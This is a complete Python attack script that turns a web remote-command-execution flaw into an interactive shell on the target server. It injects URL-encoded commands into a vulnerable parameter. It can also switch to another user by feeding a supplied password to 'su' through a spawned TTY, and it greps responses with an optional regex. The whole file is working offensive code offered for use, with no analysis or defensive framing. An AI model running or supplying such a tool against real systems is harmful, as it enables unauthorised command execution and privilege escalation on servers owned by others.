#!/usr/bin/env python3
import requests
import cmd
import argparse
import urllib.parse #url-encoding
import re 

def get_args():
    parser = argparse.ArgumentParser(description='Run shell commands through HTTP RCE as another user than www-data (reverse/bind shell alternative)')
    parser.add_argument('--url', type=str, required=True, help='URL containing the RCE vulnerability (e.g. "http://10.10.10.10/index.php?cmd=MY_CMD&foo=bar". You MUST put the "MY_CMD" string, as it will contain the dynamic RCE command).')
    parser.add_argument('--http-method', type=str, required=True, help='"HTTP method to use (GET supported only. You may edit this code otherwise)"')
    parser.add_argument('--user', type=str, default='www-data', required=False, help='username (default=www-data)')
    parser.add_argument('--passwd', type=str, required=False, help='password')
    parser.add_argument('--regex-pattern', type=str, required=False, help="Regex pattern to grep match in the response (e.g. 'Password: (.*), plz dont share it', which returns the password only)")
    return parser.parse_args()

def cmdOutput(my_cmd):
    if (user != "www-data" and not passwd):
        print("[-] You must give a password")
        print("[-] Exiting...")
        exit()

    else:
        if (user != "www-data"):
            # To run a command as another user: su <USER> -c "<COMMAND>". 
            # Then the password is asked. A one-liner trick will be used.
            # "/usr/bin/script" spawns a TTY shell, so "su" is able to run.
            my_cmd = f"""/usr/bin/script -qc 'su {user} -c "{my_cmd}"'"""

            # Sleep is used for su to read the password: 
            # https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal
            my_cmd = f"""sh -c "sleep 0.05; echo {passwd}" |{my_cmd}"""
            
            # Getting rid of 'Password: ' prompt
            my_cmd = f"{my_cmd} |tail -n +2"

        if (http_method.upper() == "GET"):
            # The command is URL encoded
            encoded_cmd = urllib.parse.quote(my_cmd)
            req = requests.get(f'{url.replace("MY_CMD",encoded_cmd)}')
            if regex_pattern:
                try:
                    print(re.findall(rf'{regex_pattern}', req.text, re.DOTALL)[0])
                except:
                    pass
            else:
                print(req.text, end='')

        else:
            print("[-] HTTP method not supported.")
            print("[-] Exiting...")
            exit()


# https://www.youtube.com/watch?v=5axsDhumfhU&t=1065s
class RemoteShell(cmd.Cmd):
    prompt = "bash > "
    def default(self, args):
        cmdOutput(args)


args = get_args()
url = args.url
http_method = args.http_method
user = args.user
passwd = args.passwd
regex_pattern = args.regex_pattern
    
RemoteShell().cmdloop()

